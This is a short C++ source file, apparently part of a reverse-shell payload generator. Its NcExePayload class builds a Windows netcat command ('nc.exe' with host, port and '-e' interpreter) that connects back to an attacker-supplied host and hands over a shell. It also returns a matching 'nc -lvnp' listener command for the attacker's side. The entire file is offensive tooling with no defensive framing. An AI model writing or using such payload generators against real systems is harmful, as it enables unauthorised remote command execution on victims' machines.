#include "Nc_Exe_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcExePayload::name() const {
return "nc_exe";
}

std::string NcExePayload::generate(const Options& opts) const {
    return "nc.exe " + opts.host + " " + std::to_string(opts.port) + " -e " + opts.interpreter;
}

std::string NcExePayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}